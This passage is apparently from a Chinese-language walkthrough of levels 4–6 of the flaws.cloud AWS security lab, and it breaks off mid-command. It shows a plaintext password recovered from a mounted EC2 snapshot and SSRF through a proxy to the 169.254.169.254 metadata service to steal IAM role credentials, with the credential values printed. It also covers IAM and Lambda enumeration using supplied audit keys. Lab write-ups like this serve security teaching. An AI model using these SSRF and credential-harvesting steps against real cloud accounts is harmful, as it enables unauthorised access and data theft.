drwxr-xr-x  <span class="token number">2</span> root root <span class="token number">12288</span> Feb <span class="token number">13</span>  <span class="token number">2017</span> sbin
drwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Jan  <span class="token number">3</span>  <span class="token number">2017</span> snap
drwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> srv
drwxr-xr-x  <span class="token number">2</span> root root  <span class="token number">4096</span> Feb  <span class="token number">5</span>  <span class="token number">2016</span> sys
drwxrwxrwt  <span class="token number">8</span> root root  <span class="token number">4096</span> Feb <span class="token number">28</span>  <span class="token number">2017</span> tmp
drwxr-xr-x <span class="token number">10</span> root root  <span class="token number">4096</span> Jan <span class="token number">13</span>  <span class="token number">2017</span> usr
drwxr-xr-x <span class="token number">14</span> root root  <span class="token number">4096</span> Feb <span class="token number">12</span>  <span class="token number">2017</span> var
lrwxrwxrwx  <span class="token number">1</span> root root    <span class="token number">29</span> Feb <span class="token number">22</span>  <span class="token number">2017</span> vmlinuz -<span class="token operator">></span> boot/vmlinuz-4.4.0-64-generic
lrwxrwxrwx  <span class="token number">1</span> root root    <span class="token number">29</span> Feb <span class="token number">21</span>  <span class="token number">2017</span> vmlinuz.old -<span class="token operator">></span> boot/vmlinuz-4.4.0-63-generic</code></pre>

<p>看起来很像一个linux系统，从哪里找到包含认证信息的文件呢？还记得level 4 描述中讲到的“当nginx在EC2上部署后，会创建一个快照”吗？所以nginx是突破点：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">ubuntu@ip-172-31-21-33:/mnt/flaws/etc/nginx$ <span class="token function">ls</span> -al

total <span class="token number">68</span>
drwxr-xr-x  <span class="token number">6</span> root root <span class="token number">4096</span> Feb <span class="token number">19</span>  <span class="token number">2017</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">94</span> root root <span class="token number">4096</span> Feb <span class="token number">19</span>  <span class="token number">2017</span> <span class="token punctuation">..</span>
-rw-r--r--  <span class="token number">1</span> root root   <span class="token number">44</span> Feb <span class="token number">13</span>  <span class="token number">2017</span> .htpasswd
drwxr-xr-x  <span class="token number">2</span> root root <span class="token number">4096</span> Oct <span class="token number">27</span>  <span class="token number">2016</span> conf.d
-rw-r--r--  <span class="token number">1</span> root root <span class="token number">1077</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> fastcgi.conf
-rw-r--r--  <span class="token number">1</span> root root <span class="token number">1007</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> fastcgi_params
-rw-r--r--  <span class="token number">1</span> root root <span class="token number">2837</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> koi-utf
-rw-r--r--  <span class="token number">1</span> root root <span class="token number">2223</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> koi-win
-rw-r--r--  <span class="token number">1</span> root root <span class="token number">3957</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> mime.types
-rw-r--r--  <span class="token number">1</span> root root <span class="token number">1533</span> Feb <span class="token number">19</span>  <span class="token number">2017</span> nginx.conf
-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">180</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> proxy_params
-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">636</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> scgi_params
drwxr-xr-x  <span class="token number">2</span> root root <span class="token number">4096</span> Feb <span class="token number">19</span>  <span class="token number">2017</span> sites-available
drwxr-xr-x  <span class="token number">2</span> root root <span class="token number">4096</span> Feb <span class="token number">19</span>  <span class="token number">2017</span> sites-enabled
drwxr-xr-x  <span class="token number">2</span> root root <span class="token number">4096</span> Feb <span class="token number">12</span>  <span class="token number">2017</span> snippets
-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">664</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> uwsgi_params
-rw-r--r--  <span class="token number">1</span> root root <span class="token number">3071</span> Apr <span class="token number">26</span>  <span class="token number">2016</span> win-utf</code></pre>

<p><code>.htpasswd</code>文件看起来很可疑：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">ubuntu@ip-172-31-21-33:/mnt/flaws/etc/nginx$ <span class="token function">cat</span> .htpasswd

flaws:<span class="token variable">$apr1</span><span class="token variable">$4ed</span>/7TEL<span class="token variable">$cJnixIRA6P4H8JDvKVMku0</span></code></pre>

<p>这应该是一串加密的密码，账户：flaws，密码（加密）：$apr1$4ed/7TEL$cJnixIRA6P4H8JDvKVMku0。尝试在<a target="_blank" rel="noopener" href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/">4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud</a>进行登录，没有成功，应该需要明文密码。</p>
<p>继续寻找可疑的目录和文件，在/home/ubuntu/中发现了一个可疑脚本<code>setupNginx.sh</code>:</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">ubuntu@ip-172-31-21-33:/mnt/flaws/home/ubuntu$ <span class="token function">cat</span> setupNginx.sh
htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M</code></pre>

<p><code>nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M</code>应该就是明文密码。尝试登录，成功通关level 4：</p>
<p><img src="https://p0.ssl.qhimg.com/t01c66ffd1bf052121f.png" srcset="/img/loading.gif"></p>
<h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><ul>
<li>在AWS中允许创建EC2的快照，这样做的主要目的是进行备份。但当忘记密码时，能够使用快照来访问EC2实例，而这也恰恰是攻击者感兴趣的地方。</li>
</ul>
<h2 id="0x06-Level-5"><a href="#0x06-Level-5" class="headerlink" title="0x06 Level 5"></a>0x06 Level 5</h2><blockquote>
<p>This EC2 has a simple HTTP only proxy on it. Here are some examples of it’s usage:</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/flaws.cloud/</a></li>
<li><a target="_blank" rel="noopener" href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/summitroute.com/blog/feed.xml</a></li>
<li><a target="_blank" rel="noopener" href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/neverssl.com/</a></li>
</ul>
<p>See if you can use this proxy to figure out how to list the contents of the level6 bucket at <a target="_blank" rel="noopener" href="http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/">level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud</a> that has a hidden directory in it</p>
</blockquote>
<p>在EC2实例上有一个简单的HTTP代理，需要用这个代理，找到level 6存储桶中的隐藏目录。</p>
<p>尝试直接在浏览器中访问<code>level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud</code>，得到的结果是<code>Access Denied</code>:</p>
<p><img src="https://p3.ssl.qhimg.com/t01294894165c74933a.png" srcset="/img/loading.gif"></p>
<p>level 5 的EC2实例给我们提供了一个代理，目标点应该就在<a target="_blank" rel="noopener" href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/</a> 里面寻找。</p>
<p>在level 4中，当我寻找可疑目录或者文件时，在/mnt/flaws/home/ubuntu/.bash_history发现了一些有趣的信息:</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">ubuntu@ip-172-31-21-33:/mnt/flaws/home/ubuntu$ <span class="token function">cat</span> .bash_history

<span class="token punctuation">..</span>.
<span class="token function">cat</span> setupNginx.sh
<span class="token function">curl</span> <span class="token number">169.254</span>.169.254
<span class="token function">curl</span>  http://169.254.169.254/latest/meta-data
<span class="token function">wget</span>  http://169.254.169.254/latest/meta-data
<span class="token function">cat</span> meta-data
<span class="token function">curl</span> -XGET http://169.254.169.254/latest/meta-data
<span class="token function">wget</span>  http://169.254.169.254/latest/meta-data/iam
<span class="token function">cat</span> iam
<span class="token function">wget</span>  http://169.254.169.254/latest/meta-data/iam/info
<span class="token function">cat</span> info
<span class="token function">rm</span> info iam
<span class="token function">ls</span>
<span class="token function">cat</span> meta-data
<span class="token function">curl</span>  http://169.254.169.254/latest/meta-data/iam/info
<span class="token function">curl</span>  http://169.254.169.254/latest/meta-data/
<span class="token function">curl</span>  http://169.254.169.254/latest/meta-data/profile/
<span class="token function">curl</span>  http://169.254.169.254/latest/meta-data/profile
<span class="token function">curl</span>  http://169.254.169.254/latest/user-data
<span class="token function">curl</span>  http://169.254.169.254/iam/security-credentials/flaws
<span class="token function">curl</span>  http://169.254.169.254/iam/security-credentials
<span class="token function">curl</span>  http://169.254.169.254/iam/security-credentials/flaws/
<span class="token function">curl</span>  http://169.254.169.254/iam/
<span class="token function">wget</span> http://169.254.169.254/iam/security-credentials/flaws
<span class="token function">curl</span>  http://169.254.169.254/meta-data/iam/security-credentials/flaws
<span class="token function">curl</span>  http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws
<span class="token function">curl</span>  http://169.254.169.254/latest/meta-data/iam/security-credentials
<span class="token function">sudo</span> <span class="token function">su</span> -
<span class="token punctuation">..</span>.</code></pre>

<p>包含<code>169.254.169.254</code>这个IP的几个操作引起了我的注意。<code>169.254.169.254</code>是一个特殊的IP地址，在云服务上（包括AWS），为元数据服务。有关内容可以参见<a target="_blank" rel="noopener" href="https://qastack.cn/server/427018/what-is-this-ip-address-169-254-169-254">https://qastack.cn/server/427018/what-is-this-ip-address-169-254-169-254</a> 。</p>
<p>我们可以用代理来获取自身的元数据，或许能找到一些认证文件或者敏感信息。尝试访问<a target="_blank" rel="noopener" href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/</a> ，得到一堆文件目录：</p>
<pre class="language-html" data-language="html"><code class="language-html">ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/</code></pre>

<p>在里面找寻敏感信息，最终在<a target="_blank" rel="noopener" href="http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws">http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws</a> 找到了泄露出的相关认证信息：</p>
<pre class="language-html" data-language="html"><code class="language-html">&#123;
  "Code" : "Success",
  "LastUpdated" : "2020-03-22T13:15:35Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA6GG7PSQGTDDQYCXX",
  "SecretAccessKey" : "GDgTEgIGzHntptP+d+OCUkh4kCt6OUpFAEwr3Pgp",
  "Token" : "IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQCRhJkGWHi5ic92C1P3CYkQ6y80qrDQOGnDoIz4PwqqbQIgNNna1gE6ze5ChRMPckatRWodHnnjjvyKPR2rhUKWiAEqvwMILhABGgw5NzU0MjYyNjIwMjkiDAFu8gkhNhgSdqABnyqcA1Uf5xMvRGDIGCeB40MAxq+HZNjhrI+EhdtFfpiAFGy6XrKKEekDvXAi9r8NnCd95nQJFdQfQWIXMtSlSjSQFf9o4o3xJ3XveYEVGqMn94t2Ch+LabJkssgeNg8vgJaT/bpagAHou4L2R73JDOg/YaLxCj1VglJlfYnzdY530P/8mW+zX+bhH2CXfGVtEW/lriFWsivYBqHtou8Om0Q34uCegkiHoGjNybToqGmEkMKZcwVzLdJ3cKQbvta2vIJ4dUo99eneSS2IHzojSZNS7ikxM31jJtrTfqIRVNreshgNLPRVxnBrd4V8ceHR7+8wyDRvFqxJ9cBePfUXhVt8xh95eeYLNSyNXJRASjwsNt6XB2au1ragGFRPJj1y2iZLZoUKeeTSqeVMmyN1w7LYjPx9rrui1er+C1t/Ytedd5WG94mJ8zEuQglY0RIcMfAChogIW6ZAq+E3DcJ/ADbuRrtMlqCnK4mq4RuwSrxND9VbA7oKWZVGPVkiFeGosgDtO6Ky/fk1uW7t3jvrzDvgok7mmLrtm3XqqySwlNAw7snd8wU65wFmeTnbDFKx3sVbLZC0/ZIOmUyuOrF3Yy/xyHjuxjKnv2xgt20jT8laVf4skWLExgSyTFxubuR0iYapG+J0dn/or9GiIMPAtXqOD6OGSzi3nDUYJkmO9dp8DTTv2hYWGKzkOLA+LpNYXM5oA50agJBJ1a461ax18xnAgwj1za44+mwW+qf6Ad272mvNgI+xKRgmXHt8OUPhDQdTqyMcQHjRaqmjLNau9Cx2Ks3ddZXlq0J/DSqOp7u7UAspnkO2OAogwvkhYGv0VDfH0W0q9WqvcoAUymJjRTWh6Ncsp+ubt+cUg0OSZuw=",
  "Expiration" : "2020-03-22T19:39:11Z"
&#125;</code></pre>

<p>成功获取到一个<code>IAM</code>角色的认证信息。我们将这个认证信息添加到~/.aws/credentials中：</p>
<pre class="language-txt" data-language="txt"><code class="language-txt">[proxy]
aws_access_key_id &#x3D; ASIA6GG7PSQGTDDQYCXX
aws_secret_access_key &#x3D; GDgTEgIGzHntptP+d+OCUkh4kCt6OUpFAEwr3Pgp
aws_session_token &#x3D; IQoJb3JpZ2luX2VjEDUaCXVzLXdlc3QtMiJHMEUCIQCRhJkGWHi5ic92C1P3CYkQ6y80qrDQOGnDoIz4PwqqbQIgNNna1gE6ze5ChRMPckatRWodHnnjjvyKPR2rhUKWiAEqvwMILhABGgw5NzU0MjYyNjIwMjkiDAFu8gkhNhgSdqABnyqcA1Uf5xMvRGDIGCeB40MAxq+HZNjhrI+EhdtFfpiAFGy6XrKKEekDvXAi9r8NnCd95nQJFdQfQWIXMtSlSjSQFf9o4o3xJ3XveYEVGqMn94t2Ch+LabJkssgeNg8vgJaT&#x2F;bpagAHou4L2R73JDOg&#x2F;YaLxCj1VglJlfYnzdY530P&#x2F;8mW+zX+bhH2CXfGVtEW&#x2F;lriFWsivYBqHtou8Om0Q34uCegkiHoGjNybToqGmEkMKZcwVzLdJ3cKQbvta2vIJ4dUo99eneSS2IHzojSZNS7ikxM31jJtrTfqIRVNreshgNLPRVxnBrd4V8ceHR7+8wyDRvFqxJ9cBePfUXhVt8xh95eeYLNSyNXJRASjwsNt6XB2au1ragGFRPJj1y2iZLZoUKeeTSqeVMmyN1w7LYjPx9rrui1er+C1t&#x2F;Ytedd5WG94mJ8zEuQglY0RIcMfAChogIW6ZAq+E3DcJ&#x2F;ADbuRrtMlqCnK4mq4RuwSrxND9VbA7oKWZVGPVkiFeGosgDtO6Ky&#x2F;fk1uW7t3jvrzDvgok7mmLrtm3XqqySwlNAw7snd8wU65wFmeTnbDFKx3sVbLZC0&#x2F;ZIOmUyuOrF3Yy&#x2F;xyHjuxjKnv2xgt20jT8laVf4skWLExgSyTFxubuR0iYapG+J0dn&#x2F;or9GiIMPAtXqOD6OGSzi3nDUYJkmO9dp8DTTv2hYWGKzkOLA+LpNYXM5oA50agJBJ1a461ax18xnAgwj1za44+mwW+qf6Ad272mvNgI+xKRgmXHt8OUPhDQdTqyMcQHjRaqmjLNau9Cx2Ks3ddZXlq0J&#x2F;DSqOp7u7UAspnkO2OAogwvkhYGv0VDfH0W0q9WqvcoAUymJjRTWh6Ncsp+ubt+cUg0OSZuw&#x3D;</code></pre>

<p>尝试使用代理访问：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws --profile proxy s3 <span class="token function">ls</span> s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud                                                 
                                   PRE ddcc78ff/                                                                           
        <span class="token number">2017</span>-02-27 <span class="token number">10</span>:11:07        <span class="token number">871</span> index.html</code></pre>

<p>成功获得权限进入，并找到隐藏目录<code>ddcc78ff/</code>，访问 <a target="_blank" rel="noopener" href="http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/">http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/</a> ，这就是level 6 的入口，成功通关level 5。</p>
<h3 id="小结：-1"><a href="#小结：-1" class="headerlink" title="小结："></a>小结：</h3><ul>
<li>IP地址169.254.169.254是云服务中的一个神奇IP，AWS、Azure、谷歌、DigitalOcean等公司都使用它来查找自身的元数据。对于谷歌，对请求有额外的约束，比如要求它使用<code>Metadata-Flavor: Google</code>作为HTTP头，拒绝带有<code>x - forwarding - for</code>头的请求，而在AWS中并没有约束。如果攻击者可以从EC2向该IP发出任何类型的HTTP请求，就很有可能获取到一些敏感信息。这里提供hackerone平台上两篇公开披露的报告用以参考学习：<a target="_blank" rel="noopener" href="https://hackerone.com/reports/53088">https://hackerone.com/reports/53088</a> 、<a target="_blank" rel="noopener" href="https://hackerone.com/reports/53004">https://hackerone.com/reports/53004</a> 。</li>
</ul>
<h2 id="0x07-Level-6"><a href="#0x07-Level-6" class="headerlink" title="0x07 Level 6"></a>0x07 Level 6</h2><blockquote>
<p>For this final challenge, you’re getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account.</p>
<p>Access key ID: AKIAJFQ6E7BY57Q3OBGA<br>Secret: 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</p>
</blockquote>
<p>最后一关提供了一个附加了安全审计策略的用户的认证信息，看看我们能找到什么有趣的信息。</p>
<p>首先使用AWS CLI 配置这个用户：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws configure --profile flawslevel6
AWS Access Key ID <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: AKIAJFQ6E7BY57Q3OBGA
AWS Secret Access Key <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: S2IpymMBlViDlqcAnFuZfkVjXrYxZYhP+dZ4ps+u
Default region name <span class="token punctuation">[</span>None<span class="token punctuation">]</span>: us-west-2
Default output <span class="token function">format</span> <span class="token punctuation">[</span>None<span class="token punctuation">]</span>:</code></pre>

<p>在<a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_job-functions.html#jf_security-auditor">AWS的文档</a>中，对<code>SecurityAudit </code>这样描述：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://console.aws.amazon.com/iam/home#policies/arn:aws:iam::aws:policy/SecurityAudit">SecurityAudit</a></p>
<p><strong>Use case:</strong> This user monitors accounts for compliance with security requirements. This user can access logs and events to investigate potential security breaches or potential malicious activity.</p>
<p><strong>Policy description:</strong> This policy grants permissions to view configuration data for many AWS services and to review their logs.</p>
</blockquote>
<p>意思就是说：该用户可以访问日志和事件来调查潜在的安全漏洞或潜在的恶意活动，被授予查看一些AWS服务的配置数据和查看其日志的权限。</p>
<p>在level 3 中，我们查看到了S3存储桶中包含的内容：</p>
<p><img src="https://p1.ssl.qhimg.com/t01b7bbaeca18c15902.png" srcset="/img/loading.gif"></p>
<p>尝试访问<code>flaws-logs</code>，结果没有权限：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws s3 <span class="token function">ls</span> s3://flaws-logs --profile flawslevel6

An error occurred <span class="token punctuation">(</span>AccessDenied<span class="token punctuation">)</span> when calling the ListObjectsV2 operation: Access Denied</code></pre>

<p>该政策可能涉及到的其他AWS服务包括<code>CloudTrail</code>和<code>CloudWatch</code>，继续尝试访问：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws cloudtrail describe-trails --profile flawslevel6

<span class="token punctuation">&#123;</span>
    <span class="token string">"trailList"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span>
            <span class="token string">"IncludeGlobalServiceEvents"</span><span class="token builtin class-name">:</span> true,
            <span class="token string">"IsOrganizationTrail"</span><span class="token builtin class-name">:</span> true,
            <span class="token string">"Name"</span><span class="token builtin class-name">:</span> <span class="token string">"summitroute-logs"</span>,
            <span class="token string">"TrailARN"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:cloudtrail:us-east-1:763647780161:trail/summitroute-logs"</span>,
            <span class="token string">"LogFileValidationEnabled"</span><span class="token builtin class-name">:</span> true,
            <span class="token string">"IsMultiRegionTrail"</span><span class="token builtin class-name">:</span> true,
            <span class="token string">"HasCustomEventSelectors"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"S3BucketName"</span><span class="token builtin class-name">:</span> <span class="token string">"summitroute-logs"</span>,
            <span class="token string">"HasInsightSelectors"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"HomeRegion"</span><span class="token builtin class-name">:</span> <span class="token string">"us-east-1"</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><code>CloudTrail</code>服务是开启的，那么尝试查看<code>CloudTrail</code>的事件，结果没有权限：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws cloudtrail lookup-events --profile flawslevel6

An error occurred <span class="token punctuation">(</span>AccessDeniedException<span class="token punctuation">)</span> when calling the LookupEvents operation: User: arn:aws:iam::975426262029:user/Level6 is not authorized to perform: cloudtrail:LookupEvents</code></pre>

<p>转换思路，查看此用户的相关信息：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws --profile flawslevel6 iam get-user

<span class="token punctuation">&#123;</span>
    <span class="token string">"User"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"UserName"</span><span class="token builtin class-name">:</span> <span class="token string">"Level6"</span>,
        <span class="token string">"Path"</span><span class="token builtin class-name">:</span> <span class="token string">"/"</span>,
        <span class="token string">"CreateDate"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-26T23:11:16Z"</span>,
        <span class="token string">"UserId"</span><span class="token builtin class-name">:</span> <span class="token string">"AIDAIRMDOSCWGLCDWOG6A"</span>,
        <span class="token string">"Arn"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:iam::975426262029:user/Level6"</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>得到<code>UserName</code>为<code>Level6</code>，继续查看这个用户的附加策略：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws --profile flawslevel6 iam list-attached-user-policies --user-name Level6

<span class="token punctuation">&#123;</span>
    <span class="token string">"AttachedPolicies"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span>
            <span class="token string">"PolicyName"</span><span class="token builtin class-name">:</span> <span class="token string">"list_apigateways"</span>,
            <span class="token string">"PolicyArn"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:iam::975426262029:policy/list_apigateways"</span>
        <span class="token punctuation">&#125;</span>,
        <span class="token punctuation">&#123;</span>
            <span class="token string">"PolicyName"</span><span class="token builtin class-name">:</span> <span class="token string">"MySecurityAudit"</span>,
            <span class="token string">"PolicyArn"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:iam::975426262029:policy/MySecurityAudit"</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>发现附加了<code>list_apigateways</code>的策略，更详细的查看这个策略：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws --profile flawslevel6 iam get-policy  --policy-arn arn:aws:iam::975426262029:policy/list_apigat eways

<span class="token punctuation">&#123;</span>
    <span class="token string">"Policy"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"PolicyName"</span><span class="token builtin class-name">:</span> <span class="token string">"list_apigateways"</span>,
        <span class="token string">"Description"</span><span class="token builtin class-name">:</span> <span class="token string">"List apigateways"</span>,
        <span class="token string">"PermissionsBoundaryUsageCount"</span><span class="token builtin class-name">:</span> <span class="token number">0</span>,
        <span class="token string">"CreateDate"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-20T01:45:17Z"</span>,
        <span class="token string">"AttachmentCount"</span><span class="token builtin class-name">:</span> <span class="token number">1</span>,
        <span class="token string">"IsAttachable"</span><span class="token builtin class-name">:</span> true,
        <span class="token string">"PolicyId"</span><span class="token builtin class-name">:</span> <span class="token string">"ANPAIRLWTQMGKCSPGTAIO"</span>,
        <span class="token string">"DefaultVersionId"</span><span class="token builtin class-name">:</span> <span class="token string">"v4"</span>,
        <span class="token string">"Path"</span><span class="token builtin class-name">:</span> <span class="token string">"/"</span>,
        <span class="token string">"Arn"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:iam::975426262029:policy/list_apigateways"</span>,
        <span class="token string">"UpdateDate"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-20T01:48:17Z"</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>我们得到了这个策略的<code>Arn</code>和<code>DefaultVersionId</code>，能够进一步详细查看：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws --profile flawslevel6 iam get-policy-version --policy-arn arn:aws:iam::975426262029:policy/list _apigateways --version-id v4

<span class="token punctuation">&#123;</span>
    <span class="token string">"PolicyVersion"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"CreateDate"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-20T01:48:17Z"</span>,
        <span class="token string">"VersionId"</span><span class="token builtin class-name">:</span> <span class="token string">"v4"</span>,
        <span class="token string">"Document"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"Version"</span><span class="token builtin class-name">:</span> <span class="token string">"2012-10-17"</span>,
            <span class="token string">"Statement"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                <span class="token punctuation">&#123;</span>
                    <span class="token string">"Action"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                        <span class="token string">"apigateway:GET"</span>
                    <span class="token punctuation">]</span>,
                    <span class="token string">"Resource"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:apigateway:us-west-2::/restapis/*"</span>,
                    <span class="token string">"Effect"</span><span class="token builtin class-name">:</span> <span class="token string">"Allow"</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">]</span>
        <span class="token punctuation">&#125;</span>,
        <span class="token string">"IsDefaultVersion"</span><span class="token builtin class-name">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>发现了这个用户允许使用<code>GET</code>方法访问资源<code>arn:aws:apigateway:us-west-2::/restapis/*</code>。<code>apigateway</code>通常与<code>Lambda</code>函数放在一起使用：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">~$ aws --region us-west-2 --profile flawslevel6 lambda list-functions

<span class="token punctuation">&#123;</span>
    <span class="token string">"Functions"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
        <span class="token punctuation">&#123;</span>
            <span class="token string">"TracingConfig"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>
                <span class="token string">"Mode"</span><span class="token builtin class-name">:</span> <span class="token string">"PassThrough"</span>
            <span class="token punctuation">&#125;</span>,
            <span class="token string">"Version"</span><span class="token builtin class-name">:</span> <span class="token string">"<span class="token variable">$LATEST</span>"</span>,
            <span class="token string">"CodeSha256"</span><span class="token builtin class-name">:</span> <span class="token string">"2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw="</span>,
            <span class="token string">"FunctionName"</span><span class="token builtin class-name">:</span> <span class="token string">"Level6"</span>,
            <span class="token string">"MemorySize"</span><span class="token builtin class-name">:</span> <span class="token number">128</span>,
            <span class="token string">"RevisionId"</span><span class="token builtin class-name">:</span> <span class="token string">"22f08307-9080-4403-bf4d-481ddc8dcb89"</span>,
            <span class="token string">"CodeSize"</span><span class="token builtin class-name">:</span> <span class="token number">282</span>,
            <span class="token string">"FunctionArn"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:lambda:us-west-2:975426262029:function:Level6"</span>,
            <span class="token string">"Handler"</span><span class="token builtin class-name">:</span> <span class="token string">"lambda_function.lambda_handler"</span>,
            <span class="token string">"Role"</span><span class="token builtin class-name">:</span> <span class="token string">"arn:aws:iam::975426262029:role/service-role/Level6"</span>,
            <span class="token string">"Timeout"</span><span class="token builtin class-name">:</span> <span class="token number">3</span>,
            <span class="token string">"LastModified"</span><span class="token builtin class-name">:</span> <span class="token string">"2017-02-27T00:24:36.054+0000"</span>,
            <span class="token string">"Runtime"</span><span class="token builtin class-name">:</span> <span class="token string">"python2.7"</span>,
            <span class="token string">"Description"</span><span class="token builtin class-name">:</span> <span class="token string">"A starter AWS Lambda function."</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">]</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>存在一个<code>FunctionName</code>叫做Level6，继续详细查看这个策略：</p>
<pre class="language-shell" data-language="shell"><code class="language-shell">aws --region us-west-2 --profile flawslevel6 lambda get-policy --function-name Level6

<span class="token punctuation">&#123;</span>
